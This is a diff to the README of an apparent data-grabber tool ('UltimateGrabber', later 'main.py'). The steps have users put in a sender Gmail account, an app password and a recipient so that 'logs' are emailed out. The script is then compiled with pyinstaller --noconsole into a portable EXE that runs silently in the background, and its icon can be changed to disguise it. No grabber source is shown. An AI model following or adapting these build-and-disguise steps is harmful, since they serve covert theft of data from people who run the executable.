@@ -26,7 +26,7 @@ Download this repository, and unzip it to your folder of choice. Open the folder
 Next, open command prompt. Type `cd`, space, and Control+V to paste. Press enter. Then type `pip install -r requirements.txt`. Wait for python to finish installing the modules, and you are done.
 
 ## #3 - Insert App Password Into Script
-Navigate to the bottom of the python script titled 'main.py'. 16 lines above the bottom (Line 44), you will find a series of variables that look like this:
+Navigate to the bottom of the python script titled 'main.py'. 16 lines above the bottom (Line 25), you will find a series of variables that look like this:
 `sender = "email@gmail.com"`
 `recipient = "recipient@gmail.com"`
 `app_password = "app password here"`.
@@ -38,7 +38,7 @@ Change the `recipient` value to the email adress you want to send the logs to. T
 ## #4 - Bundle Into EXE file 
 This next step is technically optional, but necesary if you want the script to run on a computer without python or any of the script's modules installed.
 
-To compile the code into an EXE file, we will be using the pyinstaller python module. If you don't have pyinstaller installed, you can do it easily by opening windows command prompt and typing `pip install pyinstaller`. Wait until it finishes installing.
+To compile the code into an EXE file, we will be using the pyinstaller python module. This was already installed when you used the requirements.txt file.
 
 Compiling the code is actually pretty easy. Open the folder that contains the python file you downloaded, and right click on the path bar above the file list. Click 'Copy adress as text'
 
@@ -48,10 +48,10 @@ Open command prompt once more. Now, type `cd`, spacebar, then Control+V to paste
 
 ![image](https://user-images.githubusercontent.com/83145315/186373786-2e9c5a16-656f-470c-b463-9a1dac19cd40.png)
 
-Now, type in `pyinstaller --onefile --noconsole UltimateGrabber.py` and hit enter. Pyinstaller will take about 20 seconds to compile the code. Afterwards, go check the folder which you had saved the python file again. You will see two new folders, titled `build` and `dist`. Inside `dist`, you will find an EXE file - success! you have successfully turned it into a portable executable. You can change the cover icon of the EXE using a tool such as [Resource Hacker](http://www.angusj.com/resourcehacker/#download) if you please.
+Now, type in `pyinstaller --onefile --noconsole main.py` and hit enter. Pyinstaller will take about 20 seconds to compile the code. Afterwards, go check the folder which you had saved the python file again. You will see two new folders, titled `build` and `dist`. Inside `dist`, you will find an EXE file - success! you have successfully turned it into a portable executable. You can change the cover icon of the EXE using a tool such as [Resource Hacker](http://www.angusj.com/resourcehacker/#download) if you please.
 
 If you run it, you will find a new email in you inbox - it will look something like this. It will take about 50 seconds to do its job, but does so in the background.
 
-![image](https://user-images.githubusercontent.com/83145315/187166295-977a6c99-c401-422d-945f-59260388566e.png)
+![image](https://user-images.githubusercontent.com/83145315/187167208-cd9662aa-8ea9-4447-97d7-63303d51a6ab.png)
 
 You can now move the EXE file around wherever you want, and it will still work.
